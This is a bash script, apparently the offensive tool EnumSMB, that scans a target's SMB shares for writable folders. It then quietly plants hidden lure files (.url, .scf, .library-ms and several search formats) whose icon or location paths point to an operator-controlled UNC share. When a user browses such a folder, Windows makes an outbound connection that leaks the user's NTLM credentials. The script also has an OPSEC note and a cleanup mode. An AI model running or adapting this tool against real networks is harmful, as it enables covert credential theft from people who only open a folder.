#!/bin/bash

BASE_NAME=".background-image"

# Colors for output & Sed Pipeline
GREEN='\033[0;32m'
BLUE='\033[0;34m'
RED='\033[0;31m'
YELLOW='\033[1;33m'
NC='\033[0m'

# Hardcoded escape sequences for Sed
S_RED=$(printf '\033[0;31m')
S_YELLOW=$(printf '\033[1;33m')
S_GREEN=$(printf '\033[0;32m')
S_NC=$(printf '\033[0m')

banner() {
    echo -e "${BLUE}"
    cat << "EOF"
  _____                       ____  __  __ ____  
 | ____|_ __  _   _ _ __ ___ / ___||  \/  | __ ) 
 |  _| | '_ \| | | | '_ ` _ \\___ \| |\/| |  _ \ 
 | |___| | | | |_| | | | | | |___) | |  | | |_) |
 |_____|_| |_|\__,_|_| |_| |_|____/|_|  |_|____/  v1.2
EOF
    echo "                     https://github.com/tralsesec/EnumSMB   "
    echo -e "${NC}"
    echo -e "=========================================================="
}

usage() {
    echo -e "Usage: ${BLUE}$0${NC} -i <target_IP> -l <user_IP> -m <mode> [-t <template>] [-u <user>] [-p <pass>] [-s <share>]"
    echo -e ""
    echo -e "Modes:"
    echo -e "  ${BLUE}enum${NC}       : Check read/write permissions on all directories"
    echo -e "  ${BLUE}write${NC}      : Silent upload (all templates if -t omitted)"
    echo -e "  ${BLUE}all${NC}        : Enumerate and upload simultaneously"
    echo -e "  ${BLUE}clean${NC}      : Remove template files (all extensions if -t omitted)"
    echo -e ""
    echo -e "Templates:"
    echo -e "  ${BLUE}url${NC}                 : Internet Shortcut (.url)"
    echo -e "  ${BLUE}scf${NC}                 : Windows Explorer Command (.scf)"
    echo -e "  ${BLUE}library-ms${NC}          : Windows Library Description (.library-ms)"
    echo -e "  ${BLUE}search-ms${NC}           : Saved Search (.search-ms)"
    echo -e "  ${BLUE}searchConnector-ms${NC}  : Search Connector (.searchConnector-ms)"
    echo -e "  ${BLUE}search${NC}              : Generic Search Config (.search)"
    exit 1
}

while getopts "i:l:m:t:u:p:s:" opt; do
    case $opt in
        i) IP=$OPTARG ;;
        m) MODE=$OPTARG ;;
        t) TEMPLATE=$OPTARG ;;
        u) USER=$OPTARG ;;
        p) PASS=$OPTARG ;;
        s) SHARE=$OPTARG ;;
        l) USER_IP=$OPTARG ;;
        *) usage ;;
    esac
done

USER=${USER:-"guest"}
PASS=${PASS:-""}
SHARE=${SHARE:-"tralsesec"}

if [ -z "$IP" ] || [ -z "$MODE" ] || [[ ! "$MODE" =~ ^(enum|write|all|clean)$ ]]; then
    usage
fi

get_template_details() {
    case "$1" in
        url)
            EXT=".url"
            read -r -d '' CONTENT << EOF
[InternetShortcut]
URL=http://$USER_IP
IDList=
HotKey=0
IconIndex=<index_number>
IconFile=\\\\$USER_IP\\$SHARE\\icon.ico
EOF
            ;;
        scf)
            EXT=".scf"
            read -r -d '' CONTENT << EOF
[Shell]
Command=2
IconFile=\\\\$USER_IP\\$SHARE\\icon.ico
[Taskbar]
Command=ToggleDesktop
EOF
            ;;
        library-ms)
            EXT=".library-ms"
            read -r -d '' CONTENT << EOF
<?xml version="1.0" encoding="utf-8"?>
<libraryDescription xmlns:com="http://schemas.microsoft.com/windows/2009/library">
  <isLibraryPinned>true</isLibraryPinned>
  <iconReference>imageres.dll,-1003</iconReference>
  <templateInfo>
    <folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
  </templateInfo>
  <searchConnectorDescriptionList>
    <searchConnectorDescription>
      <isDefaultSaveLocation>true</isDefaultSaveLocation>
      <isSupported>true</isSupported>
      <simpleLocation>
        <url>\\\\$USER_IP\\$SHARE\\icon.ico</url>
      </simpleLocation>
    </searchConnectorDescription>
  </searchConnectorDescriptionList>
</libraryDescription>
EOF
            ;;
        search-ms)
            EXT=".search-ms"
            read -r -d '' CONTENT << EOF
<?xml version="1.0" encoding="utf-8"?>
<persistedQuery version="1.0">
  <queryTransformations/>
  <viewInfo/>
  <scope>
    <include path="\\\\$USER_IP\\$SHARE\\icon.ico"/>
    <exclude path="C:\\Windows\\"/>
  </scope>
  <conditions>
    <attribute CLSID="{00000000-0000-0000-0000-000000000000}" name="System.Generic">
      <valueType>String</valueType>
      <value>*.pdf</value>
    </attribute>
  </conditions>
</persistedQuery>
EOF
            ;;
        searchConnector-ms)
            EXT=".searchConnector-ms"
            read -r -d '' CONTENT << EOF
<?xml version="1.0" encoding="utf-8"?>
<searchConnectorDescription xmlns="http://schemas.microsoft.com/windows/2009/searchConnector">
  <description>Remote Federated Search Connection</description>
  <isSearchOnlyProvider>true</isSearchOnlyProvider>
  <sourceUrlProvider>
    <sourceUrl>\\\\$USER_IP\\$SHARE\\search_feed.xml</sourceUrl>
  </sourceUrlProvider>
</searchConnectorDescription>
EOF
            ;;
# TODO: add .lnk, .vhd, .vhdx, .iso, .xll, .dot, .dotm, .dotx
        search)
            EXT=".search"
            read -r -d '' CONTENT << EOF
[SearchConfiguration]
Scope=\\\\$USER_IP\\$SHARE\\
IndexName=ApplicationIndex
TargetProvider=LocalOrRemote
EOF
            ;;
        *)
            echo "[-] Error: Unknown template '$1'"
            exit 1
            ;;
    esac
}

# Determine target templates
if [ -n "$TEMPLATE" ]; then
    TEMPLATES=("$TEMPLATE")
else
    TEMPLATES=("url" "scf" "library-ms" "search-ms" "searchConnector-ms" "search")
fi

# Pre-generate local temp files for uploading
if [[ "$MODE" == "write" || "$MODE" == "all" ]]; then
    for t in "${TEMPLATES[@]}"; do
        get_template_details "$t"
        echo "$CONTENT" > "/tmp/smb_embed_$t"
    done
fi

banner
echo -e "[*] Targeting ${BLUE}//$IP${NC} as ${BLUE}'$USER'${NC} [Mode: ${BLUE}$MODE${NC}]"
echo "=========================================================="

smbclient -L "//$IP" -U "$USER"%"$PASS" 2>/dev/null | sed 's/^[[:space:]]*//' | grep 'Disk' | sed 's/[[:space:]]*Disk.*//' | while read -r SHARE; do
    [ -z "$SHARE" ] && continue
    
    # 1. Check first: Do we have access to root shares?
    check_access=$(smbclient "//$IP/$SHARE" -U "$USER"%"$PASS" -c "ls" 2>&1 </dev/null)
    if echo "$check_access" | grep -q "NT_STATUS_"; then
        if [[ "$MODE" == "enum" || "$MODE" == "all" ]]; then
            echo -e "${YELLOW}[NO ACCESS]${NC}  /$SHARE"
        fi
        continue 
    fi

    # 2. Admin-Share Fast-Track:
    # Wir wollen wissen ob wir Admin sind, aber wir wollen NICHT das komplette C: Laufwerk stundenlang rekursiv durchsuchen!
    if [[ "$SHARE" == "C$" || "$SHARE" == "ADMIN$" ]]; then
        if [[ "$MODE" == "enum" || "$MODE" == "all" ]]; then
            echo -e "${RED}[ADMIN ACCESS]${NC}    /$SHARE (Skipping recursive crawl & write for OPSEC/Speed)"
        fi
        continue 
    fi

    # 3. Normal shares: Now recursively enum directories & write.
    smbclient "//$IP/$SHARE" -U "$USER"%"$PASS" -c "recurse ON; ls" 2>/dev/null | grep '^\\' | tr -d '\r' | while read -r win_path; do
        target_dir=$(echo "$win_path" | sed 's/\\$//')
        [ -z "$target_dir" ] && target_dir="\\"
        
        clean_path=$(echo "$target_dir" | tr '\\' '/')
        [ "$clean_path" = "/" ] && clean_path=""
        full_path="/$SHARE$clean_path"

        case "$MODE" in
            enum)
                if smbclient "//$IP/$SHARE" -U "$USER"%"$PASS" -c "cd \"$target_dir\"; mkdir check_perm_dir" 2>&1 </dev/null | grep -q "NT_STATUS_"; then
                    echo -e "${BLUE}[READ]${NC}       $full_path"
                else
                    smbclient "//$IP/$SHARE" -U "$USER"%"$PASS" -c "cd \"$target_dir\"; rmdir check_perm_dir" >/dev/null 2>&1 </dev/null
                    echo -e "${RED}[READ/WRITE]${NC} $full_path"
                fi
                ;;
                
            write|all)
                if smbclient "//$IP/$SHARE" -U "$USER"%"$PASS" -c "cd \"$target_dir\"; mkdir check_perm_dir" 2>&1 </dev/null | grep -q "NT_STATUS_"; then
                    [ "$MODE" == "all" ] && echo -e "${BLUE}[READ]${NC}       $full_path"
                else
                    smbclient "//$IP/$SHARE" -U "$USER"%"$PASS" -c "cd \"$target_dir\"; rmdir check_perm_dir" >/dev/null 2>&1 </dev/null
                    [ "$MODE" == "all" ] && echo -e "${RED}[READ/WRITE]${NC} $full_path"
                    
                    # Upload all selected templates
                    for t in "${TEMPLATES[@]}"; do
                        get_template_details "$t"
                        if smbclient "//$IP/$SHARE" -U "$USER"%"$PASS" -c "cd \"$target_dir\"; put \"/tmp/smb_embed_$t\" \"${BASE_NAME}${EXT}\"" >/dev/null 2>&1 </dev/null; then
                            echo -e "${GREEN}[UPLOADED]${NC}   $full_path/${BASE_NAME}${EXT}"
                        fi
                    done
                fi
                ;;
                
            clean)
                for t in "${TEMPLATES[@]}"; do
                    get_template_details "$t"
                    del_out=$(smbclient "//$IP/$SHARE" -U "$USER"%"$PASS" -c "cd \"$target_dir\"; del \"${BASE_NAME}${EXT}\"" 2>&1 </dev/null)
                    if ! echo "$del_out" | grep -qE "NT_STATUS_OBJECT_NAME_NOT_FOUND|NT_STATUS_NO_SUCH_FILE|NT_STATUS_ACCESS_DENIED"; then
                        echo -e "${GREEN}[CLEANED]${NC}    $full_path/${BASE_NAME}${EXT}"
                    fi
                done
                ;;
        esac
    done
done

# Cleanup temporary files
rm -f /tmp/smb_embed_* 2>/dev/null
